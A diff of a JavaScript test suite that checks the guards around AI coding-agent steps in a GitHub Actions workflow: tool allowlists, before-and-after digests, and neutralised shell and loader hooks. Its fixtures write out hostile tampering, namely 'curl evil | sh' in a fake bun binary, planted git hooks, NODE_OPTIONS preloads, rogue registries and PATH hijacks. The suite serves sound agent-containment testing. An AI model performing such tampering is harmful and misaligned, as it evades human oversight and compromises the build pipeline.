@@ -264,7 +264,19 @@ test("every agent step is followed by a dependency rebuild before any repository
   // execute on the next import, which is the boundary check itself.
   const isAgent = (s) => s.uses?.startsWith("anthropics/claude-code-action@");
   const isRebuild = (s) => s.name === "Guard the executable surface and rebuild dependencies";
-  const runsRepoCode = (s) => /(^|\s)(node|bun|npm)\s/m.test(s.run ?? "");
+  // Commentary is not behaviour: a comment naming node or bun is not a run of
+  // either, and reading it as one has bitten this file before. Neither is
+  // naming one in a word list -- `for c in git node bun gh` asks where they
+  // are, it does not run them. Everything else counts: `then node ...`,
+  // `do bun ...` and `env FOO=1 node ...` are all runs, and a test whose job is
+  // to prove nothing runs before the rebuild must not be the thing that misses
+  // one.
+  const runsRepoCode = (s) =>
+    (s.run ?? "")
+      .split("\n")
+      .filter((l) => !/^\s*#/.test(l))
+      .map((l) => l.trim())
+      .some((l) => /(^|\s)(node|bun|npm)\s/.test(l) && !/^for\s+\w+\s+in\s/.test(l));
   let checked = 0;
   for (const job of ["author", "review"]) {
     const steps = workflow.jobs[job].steps;
@@ -293,12 +305,25 @@ test("the dependency rebuild verifies its own inputs with git, not with the tree
   for (const step of rebuilds) {
     // Both halves matter: an edited lockfile and a created bunfig.toml or
     // .npmrc redirect the install just as effectively.
-    assert.match(step.run, /surface="[^"]*package\.json bun\.lock[^"]*bunfig\.toml \.npmrc"/);
-    assert.match(step.run, /git diff --name-only -z [^\n]*\$surface/);
-    assert.match(step.run, /git ls-files --others -z -- \$surface/);
+    assert.match(step.run, /surface="[^"]*package\.json bun\.lock[^"]*bunfig\.toml \.npmrc /);
+    // bun loads .env on its own, so NODE_OPTIONS set there needs no $GITHUB_ENV.
+    assert.match(step.run, /surface="[^"]*\.env \.env\.\*"/);
+    assert.match(step.run, /"\$GIT" diff --name-only -z [^\n]*\$surface/);
+    assert.match(step.run, /"\$GIT" ls-files --others -z -- \$surface/);
     assert.match(step.run, /::error::/);
     assert.match(step.run, /exit 1/);
-    assert.match(step.run, /rm -rf node_modules/);
+    assert.match(step.run, /"\$RM" -rf node_modules/);
+    // The lockfile pins what is installed, not what the cache hands over, and
+    // the cache is a directory the runner user owns.
+    // Lines, not a substring search: the comment above the command names the
+    // cache path too, and a comment is not an emptied cache.
+    const commands = step.run.split("\n").filter((l) => !/^\s*#/.test(l));
+    const purge = commands.findIndex((l) =>
+      /^\s*(bun pm cache rm|"\$RM" -rf "\$\{HOME\}\/\.bun|rm -rf "\$\{HOME\}\/\.bun)/.test(l),
+    );
+    const install = commands.findIndex((l) => /^\s*bun install/.test(l));
+    assert.notEqual(purge, -1, "the install trusts whatever is in the bun cache");
+    assert.ok(purge < install, "the cache is emptied after the install that reads it");
   }
 });
 
@@ -420,7 +445,7 @@ test("the dependency guard scans what bun reads, not the tree it is about to del
     // named, so it would hand .gitignore a veto over what this check sees --
     // and .npmrc is one of the files most likely to end up in it.
     assert.doesNotMatch(commands, /--exclude-standard/);
-    assert.match(commands, /git ls-files --others -z/);
+    assert.match(commands, /"\$GIT" ls-files --others -z/);
     // The check meant to catch a tampered script is itself `node scripts/...`,
     // and node resolves imports by walking up from the script's directory.
     assert.match(commands, /surface="scripts \.github /);
@@ -560,29 +585,175 @@ test("reconcile-decisions refuses a handed list that disagrees with the diff, an
   }
 });
 
-test("every agent writes only into the directory nothing in the workflow trusts", () => {
+test("each agent gets exactly the tools it needs, and no scoped grant", () => {
   const workflow = parseYaml(
     readFileSync(new URL("../.github/workflows/content-replenish.yml", import.meta.url), "utf8"),
   );
-  // The first supervised run lost all three agent outputs: every
-  // Write(<literal path under a gitignored directory>) rule was denied, while
-  // Write(content/questions/**) in the same run was honoured. _agent/** is the
-  // shape that worked, in a directory that is not gitignored, so neither
-  // variable is left in play.
+  // Established on 2026-09-06 across four runs: on this action every
+  // Write(<pattern>) form is refused at call time -- "Claude requested
+  // permissions to write to <path>, but you haven't granted it yet" -- while
+  // the step still reports success and hides the refusal in
+  // permission_denials_count. `_agent/**`, its absolute //<workspace>/ form
+  // and `_run/agent/**` were all denied; the bare tool was accepted. So
+  // tightening this string is a silent outage, not a hardening.
+  //
+  // The set is asserted whole rather than by forbidding two spellings: with
+  // the grant no longer narrowing anything, the tool LIST is the only lever
+  // left, and a WebFetch, an mcp__* entry or --dangerously-skip-permissions
+  // added later must fail here rather than pass unnoticed.
+  const expected = {
+    "Author agent selects pages to capture": ["Read", "Glob", "Grep", "Write"],
+    "Author agent writes review_ready questions": ["Read", "Glob", "Grep", "Write", "Edit"],
+    "Independent reviewer decides per item": ["Read", "Glob", "Grep", "Write"],
+  };
   const agents = [...workflow.jobs.author.steps, ...workflow.jobs.review.steps].filter((s) =>
     s.uses?.startsWith("anthropics/claude-code-action@"),
   );
   assert.equal(agents.length, 3);
   for (const step of agents) {
-    const grants = [...step.with.claude_args.matchAll(/(Write|Edit)\(([^)]*)\)/g)].map((m) => m[2]);
-    assert.ok(grants.length > 0, `${step.name} grants no write at all`);
-    for (const g of grants) {
-      assert.ok(
-        g === "_agent/**" || g === "content/questions/**",
-        `${step.name} may write ${g}, which is neither the agent scratch directory nor the question bank`,
+    const args = step.with.claude_args;
+    for (const flag of ["--tools", "--allowedTools"]) {
+      const value = new RegExp(`${flag} "([^"]*)"`).exec(args)?.[1];
+      assert.ok(value !== undefined, `${step.name} passes no ${flag}`);
+      assert.deepEqual(
+        value.split(",").map((t) => t.trim()),
+        expected[step.name],
+        `${step.name} ${flag}`,
       );
     }
+    assert.doesNotMatch(args, /--dangerously/, `${step.name} disables permissions wholesale`);
   }
+});
+
+test("every agent is bracketed by a snapshot and a verification of what the next steps trust", () => {
+  const workflow = parseYaml(
+    readFileSync(new URL("../.github/workflows/content-replenish.yml", import.meta.url), "utf8"),
+  );
+  // The grant reaches every file in the workspace, so the boundary check -- expressed
+  // in repository terms and exempts _run/ -- is not enough on its own. What
+  // closes it is a digest taken before the agent and compared after, with the
+  // expected value in the snapshot step's OUTPUT rather than in a file the
+  // agent could rewrite.
+  for (const job of ["author", "review"]) {
+    const steps = workflow.jobs[job].steps;
+    steps.forEach((step, i) => {
+      if (!step.uses?.startsWith("anthropics/claude-code-action@")) return;
+      const before = steps[i - 1];
+      assert.equal(
+        before?.name,
+        "Snapshot what the agent must not touch",
+        `nothing snapshots before ${step.name}`,
+      );
+      assert.ok(before.id, "the snapshot step must have an id to be referenced");
+      assert.equal(before.if ?? null, step.if ?? null, "the snapshot must run exactly when the agent does");
+
+      const after = steps.slice(i + 1);
+      const verify = after.find((s) => s.name === "Nothing the next steps trust moved");
+      assert.ok(verify, `nothing verifies after ${step.name}`);
+      // A snapshot that is skipped is loud -- the verification then has no
+      // digest to compare against -- but a verification that is skipped is
+      // silent, and the run continues on a tree nothing vouched for.
+      assert.equal(
+        verify.if ?? null,
+        step.if ?? null,
+        `the verification after ${step.name} runs on a different condition`,
+      );
+      // Compared against the step output, never against the saved file, and
+      // read as data through env rather than spliced into the script.
+      for (const key of ["EXPECTED_DIGEST", "EXPECTED_PATH"]) {
+        const field = key === "EXPECTED_DIGEST" ? "digest" : "path";
+        assert.equal(
+          verify.env?.[key],
+          ["$", "{{ steps.", before.id, ".outputs.", field, " }}"].join(""),
+          `the verification after ${step.name} does not take ${field} from ${before.id}'s output`,
+        );
+        assert.match(verify.run, new RegExp(`\\$${key}\\b`));
+      }
+      // And before anything that reads the tree it just vouched for.
+      const guard = after.findIndex(
+        (s) => s.name === "Guard the executable surface and rebuild dependencies",
+      );
+      assert.notEqual(guard, -1, `nothing rebuilds dependencies after ${step.name}`);
+      assert.ok(after.indexOf(verify) < guard, "the verification must precede the dependency rebuild");
+    });
+  }
+});
+
+test("the shell hooks that run before a guard's first line are emptied where the guard runs", () => {
+  const workflow = parseYaml(
+    readFileSync(new URL("../.github/workflows/content-replenish.yml", import.meta.url), "utf8"),
+  );
+  // BASH_ENV is sourced while bash starts, before the first line of the script
+  // it was given, so a check written inside that script has already lost: the
+  // sourced file can exit 0 on its behalf. LD_PRELOAD is the same story one
+  // level down, at exec. $GITHUB_ENV carries both into the next step, and a
+  // step-level env: is what outranks it.
+  // LD_LIBRARY_PATH is not emptied but pointed nowhere: the loader splits it
+  // like PATH, where an empty entry is the current directory.
+  const hooks = {
+    BASH_ENV: "",
+    ENV: "",
+    SHELLOPTS: "",
+    BASHOPTS: "",
+    PS4: "",
+    LD_PRELOAD: "",
+    // The loader runs an LD_AUDIT library before bash's first instruction, so
+    // it is the same class as BASH_ENV rather than a variant of LD_PRELOAD.
+    LD_AUDIT: "",
+    LD_DEBUG: "",
+    LD_LIBRARY_PATH: "/nonexistent",
+  };
+  // Derived, not listed, and not narrowed to the steps around an agent: once
+  // $GITHUB_ENV has been applied, EVERY later shell step starts a bash under
+  // it -- the boundary check, the capture holding the R2 keys, the pushes
+  // carrying the App token. So the rule is every `run:` step from the first
+  // snapshot onward, and a step added there later cannot escape by not being
+  // on a list. The snapshot itself is in for a second reason: it is the other
+  // side of the environment comparison, and a variable present on one side
+  // only would be a difference on every run.
+  let checked = 0;
+  for (const job of ["author", "review"]) {
+    const steps = workflow.jobs[job].steps;
+    const start = steps.findIndex((s) => s.name === "Snapshot what the agent must not touch");
+    assert.notEqual(start, -1, `${job} never snapshots`);
+    for (const step of steps.slice(start)) {
+      if (step.run === undefined) continue;
+      for (const [v, value] of Object.entries(hooks)) {
+        assert.equal(step.env?.[v], value, `${job}: ${step.name} leaves ${v} as the agent left it`);
+      }
+      checked += 1;
+    }
+  }
+  assert.ok(checked >= 12, `only ${checked} shell steps carry the neutralisation`);
+});
+
+test("the live drift check treats only its own exit codes as success", () => {
+  const workflow = parseYaml(
+    readFileSync(new URL("../.github/workflows/content-replenish.yml", import.meta.url), "utf8"),
+  );
+  const step = workflow.jobs.author.steps.find(
+    (s) => s.name === "Quarantine live drift, capture pages, re-validate what survives",
+  );
+  assert.ok(step, "the drift step is gone or renamed");
+  const branch = /case "\$code" in[\s\S]*?esac/.exec(step.run);
+  assert.ok(branch, "the exit code is not read as a set of codes");
+  // capture-source: 0 clean, 2 drift found, 1 unreachable. 137 is the OOM
+  // killer, and it used to pass as "not 1".
+  const status = (code) => {
+    try {
+      execFileSync("bash", ["-c", `set -euo pipefail\ncode=${code}\n${branch[0]}`], {
+        stdio: ["ignore", "pipe", "pipe"],
+      });
+      return 0;
+    } catch (err) {
+      return err.status;
+    }
+  };
+  assert.equal(status(0), 0, "a clean check must continue");
+  assert.equal(status(2), 0, "drift found and marked is the expected path");
+  assert.equal(status(1), 1, "an unreachable source must stop the run");
+  assert.equal(status(137), 1, "the OOM killer must stop the run");
+  assert.equal(status(127), 1, "an interpreter that would not start must stop the run");
 });
 
 test("a silent agent fails the run instead of degrading quietly", () => {
@@ -612,7 +783,7 @@ test("the executable-surface guard, run as bash, catches what it claims to", () 
   );
   // Matching strings in step.run is not evidence: two of this workflow's worst
   // defects read correctly and were wrong only when executed, and no CI runs
-  // this file. So run the guard itself. Everything up to `rm -rf node_modules`
+  // this file. So run the guard itself. Everything up to the node_modules wipe
   // is the check; the install below it needs a network and is not the subject.
   // All three copies, not the first: they differ in base ref and `if:`, and
   // three hand-synchronised copies of a security check is exactly the drift
@@ -621,9 +792,15 @@ test("the executable-surface guard, run as bash, catches what it claims to", () 
     (s) => s.name === "Guard the executable surface and rebuild dependencies",
   );
   assert.equal(steps.length, 3);
-  const guards = steps.map((step) =>
-    step.run.slice(0, step.run.indexOf("rm -rf node_modules")).replace(/\$\{\{[^}]*\}\}/g, "HEAD"),
-  );
+  const guards = steps.map((step) => {
+    // Anchored on the wipe that ends the check. indexOf returning -1 here
+    // would slice to the last character instead, and the test would then run
+    // the install it exists to stop short of -- a green-looking rewrite of
+    // what is being tested. Fail on the anchor, not on its consequences.
+    const end = step.run.indexOf(String.raw`"$RM" -rf node_modules`);
+    assert.notEqual(end, -1, `${step.name} no longer ends its check at the node_modules wipe`);
+    return step.run.slice(0, end).replace(/\$\{\{[^}]*\}\}/g, "HEAD");
+  });
   // One copy anchors at the pre-agent commit, so the substitution must have
   // actually replaced something rather than being decorative.
   assert.ok(
@@ -707,6 +884,14 @@ test("the executable-surface guard, run as bash, catches what it claims to", () 
     1,
     "a gitignored .npmrc must fail the guard",
   );
+  assert.equal(
+    fixture((dir) => {
+      writeFileSync(join(dir, ".gitignore"), "node_modules\n.env\n");
+      writeFileSync(join(dir, ".env"), "NODE_OPTIONS=--require /tmp/evil.js\n");
+    }),
+    1,
+    "bun loads .env by itself, and the next step is bun install",
+  );
   // An untracked question file is the agent doing its job, not an intruder.
   assert.equal(
     fixture((dir) => {
@@ -743,7 +928,7 @@ test("the agent scratch directory is pruned to its one expected file", () => {
     (s) => s.name === "The agent produced its output",
   );
   assert.equal(checks.length, 3);
-  for (const step of checks) assert.match(step.run, /find _agent -mindepth 1 ! -path "\$f" -delete/);
+  for (const step of checks) assert.match(step.run, /"\$FIND" _agent -mindepth 1 ! -path "\$f" -delete/);
 
   const dir = mkdtempSync(join(tmpdir(), "academy-agentdir-"));
   try {
@@ -817,6 +1002,270 @@ test("both agent outputs reach an artifact, including on the run that failed", (
     ).with.path;
     assert.match(path, /_agent\//, `${name} artifact does not carry the agent's own output`);
   }
+});
+
+test("the guards resolve their own tools from a directory the agent cannot write", () => {
+  const workflow = parseYaml(
+    readFileSync(new URL("../.github/workflows/content-replenish.yml", import.meta.url), "utf8"),
+  );
+  // PATH is checked for new entries, but a directory already on it can be
+  // writable -- ~/.bun/bin is, and the runner user owns it. A file named
+  // sha256sum or env placed there is resolved by the guard itself, which is
+  // the one script that must not be.
+  const guards = [...workflow.jobs.author.steps, ...workflow.jobs.review.steps].filter((s) =>
+    [
+      "Snapshot what the agent must not touch",
+      "Nothing the next steps trust moved",
+      "Guard the executable surface and rebuild dependencies",
+      "The agent produced its output",
+    ].includes(s.name),
+  );
+  assert.equal(guards.length, 12);
+  for (const step of guards) {
+    assert.match(step.run, /bin\(\) \{ if \[ -x "\/usr\/bin\/\$1" \]/, `${step.name} resolves through PATH`);
+    // Command position only: `"$GIT" diff` is not a call to diff, and the
+    // `bin` helper names every tool once by construction.
+    const called = step.run
+      .split("\n")
+      .filter((l) => !/^\s*#/.test(l) && !/^\s*(bin\(\)|[A-Z]+=\$\(bin )/.test(l.trim()))
+      .flatMap((l) => l.split(/\|\||&&|[|;]|\$\(|\)|`/))
+      // The first word of a fragment is not always the command: a leading
+      // `VAR=value` run is an assignment prefix, and `then`/`else`/`do`/`!`
+      // are keywords. Taking [0] meant `LC_ALL=C "$SORT" -z` read as
+      // `LC_ALL=C`, so `sort` in the list below matched nothing that can ever
+      // appear and reverting it to the bare name kept the test green.
+      .map((fragment) =>
+        fragment
+          .trim()
+          .split(/\s+/)
+          .find((w) => !/^([A-Za-z_]\w*=|then$|else$|do$|!$)/.test(w)),
+      )
+      .filter(Boolean);
+    for (const tool of ["sha256sum", "xargs", "sort", "find", "cut", "env", "diff", "git", "tr", "rm"]) {
+      assert.ok(!called.includes(tool), `${step.name} calls ${tool} by name, not by path`);
+    }
+  }
+});
+
+test("the snapshot-and-verify pair, run as bash, catches what it claims to", () => {
+  const workflow = parseYaml(
+    readFileSync(new URL("../.github/workflows/content-replenish.yml", import.meta.url), "utf8"),
+  );
+  const steps = [...workflow.jobs.author.steps, ...workflow.jobs.review.steps];
+  const snapshots = steps.filter((s) => s.name === "Snapshot what the agent must not touch");
+  const verifies = steps.filter((s) => s.name === "Nothing the next steps trust moved");
+  assert.equal(snapshots.length, 3);
+  assert.equal(verifies.length, 3);
+  // Three hand-copied pairs. Normalise away the only things that legitimately
+  // differ -- the step id and the expression carrying the expected digest --
+  // and the rest must be identical, which is what makes running one copy
+  // evidence about all three.
+  const norm = (run, id) => run.replaceAll(id, "ID").replace(/\$\{\{[^}]*\}\}/g, "$EXPECTED");
+  const snapText = snapshots.map((s) => norm(s.run, s.id));
+  const verText = snapshots.map((s, i) => norm(verifies[i].run, s.id));
+  assert.deepEqual([...new Set(snapText)], [snapText[0]], "the snapshot copies have drifted apart");
+  assert.deepEqual([...new Set(verText)], [verText[0]], "the verification copies have drifted apart");
+
+  // `before` runs while the fixture still stands for "nothing has happened
+  // yet": it is how a case puts something on PATH that the snapshot must see
+  // as legitimate. `plant` is the agent.
+  const fixture = (plant, before) => {
+    const dir = mkdtempSync(join(tmpdir(), "academy-agentguard-"));
+    try {
+      const home = join(dir, "home");
+      const temp = join(dir, "temp");
+      mkdirSync(home, { recursive: true });
+      mkdirSync(temp, { recursive: true });
+      mkdirSync(join(dir, "_run", "captured"), { recursive: true });
+      mkdirSync(join(dir, "_agent"), { recursive: true });
+      writeFileSync(join(dir, "_run", "candidates.json"), '{"newPages":[]}');
+      writeFileSync(join(dir, "_run", "captured", "src-a.md"), "# page\n");
+      execFileSync("git", ["init", "-q", "-b", "main"], { cwd: dir });
+      /** @type {Record<string, string | undefined>} */
+      const env = {
+        ...process.env,
+        HOME: home,
+        RUNNER_TEMP: temp,
+        GITHUB_WORKSPACE: dir,
+        GITHUB_OUTPUT: join(temp, "out.txt"),
+      };
+      delete env.NODE_OPTIONS;
+      delete env.XDG_CONFIG_HOME;
+      Object.assign(env, before?.(dir, home, env) ?? {});
+      writeFileSync(env.GITHUB_OUTPUT, "");
+      execFileSync("bash", ["-c", snapText[0].replace(/\bID\b/g, "guard")], {
+        cwd: dir,
+        env,
+        stdio: ["ignore", "pipe", "pipe"],
+      });
+      const written = readFileSync(env.GITHUB_OUTPUT, "utf8");
+      const digest = /digest=(\w+)/.exec(written)[1];
+      const path = /^path=(.*)$/m.exec(written)[1];
+      const after = plant(dir, home, env) ?? env;
+      try {
+        execFileSync("bash", ["-c", verText[0].replace(/\bID\b/g, "guard")], {
+          cwd: dir,
+          env: { ...after, EXPECTED_DIGEST: digest, EXPECTED_PATH: path },
+          stdio: ["ignore", "pipe", "pipe"],
+        });
+        return 0;
+      } catch (err) {
+        return err.status;
+      }
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  };
+
+  assert.equal(
+    fixture(() => {}),
+    0,
+    "an untouched tree must pass",
+  );
+  assert.equal(
+    fixture((dir) =>
+      writeFileSync(join(dir, "_run", "candidates.json"), '{"newPages":[{"url":"x","title":"steer"}]}'),
+    ),
+    1,
+    "_run/candidates.json is the sole source of the offered set and must not move",
+  );
+  assert.equal(
+    fixture((dir) => {
+      mkdirSync(join(dir, ".git", "hooks"), { recursive: true });
+      writeFileSync(join(dir, ".git", "hooks", "pre-commit"), "#!/bin/sh\ncurl evil\n");
+    }),
+    1,
+    "a planted git hook must fail",
+  );
+  assert.equal(
+    fixture((dir) => execFileSync("git", ["config", "core.hooksPath", "/tmp/evil"], { cwd: dir })),
+    1,
+    "core.hooksPath is arbitrary code on the next git command",
+  );
+  assert.equal(
+    fixture((_dir, home) => writeFileSync(join(home, ".npmrc"), "registry=https://evil.example\n")),
+    1,
+    "$HOME is outside every repo-relative check, and confinement to the workspace is the CLI's, not ours",
+  );
+  assert.equal(
+    fixture((_dir, _home, env) => ({ ...env, NODE_OPTIONS: "--require /tmp/evil.js" })),
+    1,
+    "NODE_OPTIONS through $GITHUB_ENV is the standard Actions escalation",
+  );
+  assert.equal(
+    fixture((dir, _home, env) => ({ ...env, PATH: `${dir}:${env.PATH}` })),
+    1,
+    "a PATH entry under the workspace shadows every command the next steps run",
+  );
+  assert.equal(
+    fixture((dir, _home, env) => ({ ...env, PATH: `${env.HOME}/bin:${env.PATH}` })),
+    1,
+    "$HOME/bin is neither the workspace nor the runner temp, and $GITHUB_PATH prepends",
+  );
+  assert.equal(
+    fixture((_dir, _home, env) => ({ ...env, PATH: `${env.HOME}/.bun/bin:${env.PATH}` })),
+    1,
+    "this workflow's own setup-bun step ran before the snapshot, so this entry is new",
+  );
+  assert.equal(
+    fixture(
+      (dir) => {
+        // A file named like one of the guard's own tools, in a directory that
+        // was ALREADY on PATH before the snapshot -- so nothing new appears on
+        // PATH and that check has nothing to say. If the script resolved its
+        // tools through PATH, this sha256sum would answer for every file and
+        // the change below would be invisible.
+        writeFileSync(join(dir, "bin", "sha256sum"), "#!/bin/sh\necho 'd41d8 -'\n", { mode: 0o755 });
+        writeFileSync(join(dir, "_run", "candidates.json"), '{"newPages":[{"url":"x"}]}');
+      },
+      (dir, _home, env) => {
+        mkdirSync(join(dir, "bin"), { recursive: true });
+        return { PATH: `${join(dir, "bin")}:${env.PATH}` };
+      },
+    ),
+    1,
+    "the guard resolves its own tools from PATH, which the agent can populate",
+  );
+  assert.equal(
+    fixture((_dir, _home, env) => ({ ...env, SOMETHING_NEW: "x" })),
+    1,
+    "a variable the agent appended to $GITHUB_ENV is visible as a variable, whatever its name",
+  );
+  assert.equal(
+    // The runner sets INPUT_* when it invokes an action, never for a `run:`
+    // step, so here the namespace has exactly one possible origin -- and
+    // download-artifact reads INPUT_GITHUB-TOKEN from it.
+    fixture((_dir, _home, env) => ({ ...env, INPUT_GITHUB_TOKEN: "x", STATE_x: "y" })),
+    1,
+    "INPUT_* and STATE_* are not excluded from the comparison",
+  );
+  assert.equal(
+    fixture(
+      // The runner user owns ~/.bun/bin, so overwriting the binary there needs
+      // no PATH change at all -- and `bun install` runs two steps later.
+      (dir) => writeFileSync(join(dir, "bin", "bun"), "#!/bin/sh\ncurl evil | sh\n", { mode: 0o755 }),
+      (dir, _home, env) => {
+        const bin = join(dir, "bin");
+        mkdirSync(bin, { recursive: true });
+        writeFileSync(join(bin, "bun"), "#!/bin/sh\nexec /usr/bin/true\n", { mode: 0o755 });
+        return { PATH: `${bin}:${env.PATH}` };
+      },
+    ),
+    1,
+    "the binary the next step runs is part of what the next step trusts",
+  );
+  assert.equal(
+    fixture((_dir, _home, env) => ({ ...env, PATH: `:${env.PATH}` })),
+    1,
+    "an empty PATH element is the current directory and survives word splitting",
+  );
+  // Both remaining cases are about the SHAPE of PATH, so neither may depend on
+  // the shape the runner happens to hand the job: an ambient empty field makes
+  // another one legitimate -- correctly, it was there before the agent -- and
+  // the case would then prove nothing. `pinned` removes empty fields before
+  // the snapshot, so the planted one is the only one.
+  const pinned = (_dir, _home, env) => ({ PATH: env.PATH.split(":").filter(Boolean).join(":") });
+  // The leading case above survives word splitting on its own; the trailing one
+  // does not -- bash drops a trailing empty field even when IFS is a
+  // non-whitespace character -- so it is the cheaper half of the same trick and
+  // needs the sentinel to be seen at all.
+  assert.equal(
+    fixture((_dir, _home, env) => ({ ...env, PATH: `${env.PATH}:` }), pinned),
+    1,
+    "a trailing colon adds the current directory to PATH and must not be dropped",
+  );
+  // The sentinel that makes the trailing field interior is dropped by
+  // position. Were it dropped by value, its own name -- a literal string in a
+  // public workflow file -- would be the one entry this allowlist waves
+  // through.
+  assert.equal(
+    fixture((_dir, _home, env) => ({ ...env, PATH: `__pathguard__:${env.PATH}` }), pinned),
+    1,
+    "the sentinel's name is not a way onto PATH",
+  );
+  assert.equal(
+    fixture((_dir, home) => {
+      mkdirSync(join(home, ".config", "git"), { recursive: true });
+      writeFileSync(join(home, ".config", "git", "config"), "[core]\n\thooksPath = /tmp/evil\n");
+    }),
+    1,
+    "git reads the XDG file in addition to ~/.gitconfig",
+  );
+  assert.equal(
+    fixture((dir, _home, env) => {
+      mkdirSync(join(dir, "xdg", "git"), { recursive: true });
+      writeFileSync(join(dir, "xdg", "git", "config"), "[core]\n\thooksPath = /tmp/evil\n");
+      return { ...env, XDG_CONFIG_HOME: join(dir, "xdg") };
+    }),
+    1,
+    "repointing the lookup is as good as editing the file it lands on",
+  );
+  // The agent's own file is not in the manifest: writing it must not fail.
+  assert.equal(
+    fixture((dir) => writeFileSync(join(dir, "_agent", "select.json"), "[]")),
+    0,
+    "the agent's own output is not part of what it must not touch",
+  );
 });
 
 test("a review job that finds nothing to review fails instead of going green", () => {
@@ -1087,6 +1536,26 @@ test("changedQuestionFiles sees untracked files, and the guard caps and protects
     });
     assert.ok(problems.some((p) => /q-pub000000001\.yaml was published/.test(p)));
     assert.deepEqual(reviewIds({ base, cwd: dir }), ["q-new000000001", "q-new000000002", "q-nrv000000001"]);
+    // A .gitignore the agent writes must not decide what the cap counts: with
+    // --exclude-standard the two files below vanish from every check while
+    // staying in the tree the gates run over.
+    writeFileSync(join(dir, "content", "questions", ".gitignore"), "q-hid*.yaml\n");
+    writeFileSync(
+      join(dir, "content", "questions", "q-hid000000001.yaml"),
+      yaml(q("q-hid000000001", "review_ready", "src-a")),
+    );
+    const withIgnore = changedQuestionFiles({ base, cwd: dir });
+    assert.ok(
+      withIgnore.includes("content/questions/q-hid000000001.yaml"),
+      "an ignored question file is hidden",
+    );
+    assert.ok(withIgnore.includes("content/questions/.gitignore"), "the .gitignore itself is not reported");
+    assert.ok(
+      guardChanges({ changed: withIgnore, statusAtBase, max: 10 }).some((p) =>
+        /\.gitignore is not a \.yaml file/.test(p),
+      ),
+      "the guard lets a non-question file into content/questions",
+    );
   } finally {
     rmSync(dir, { recursive: true, force: true });
   }
